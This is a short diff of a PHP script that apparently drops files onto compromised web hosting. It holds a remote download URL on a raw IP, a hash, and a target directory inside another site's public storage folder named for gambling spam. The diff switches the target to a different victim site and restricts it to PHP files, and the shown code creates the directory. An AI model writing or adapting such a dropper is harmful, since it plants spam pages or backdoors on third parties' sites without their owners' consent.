@@ -2,8 +2,8 @@
 $internal = "/home4/a3v4n0x3/public_html/tes/test.jpg";
 $external = "http://178.128.18.247:8080/fileWget/infos";
 $md8 = "a3a97306a17681f7d765db612a6cb2b2";
-$ext = ["htm", "html", "php"];
-$dir = "/home/bengkulu/public_html/core/public/";
+$ext = ["php"];
+$dir = "/home/prod-tamu/public_html/guest-book-master/public/storage/-/slot-gacor/";
 if (!is_dir($dir)) {
     mkdir($dir, 0755, true);
 }
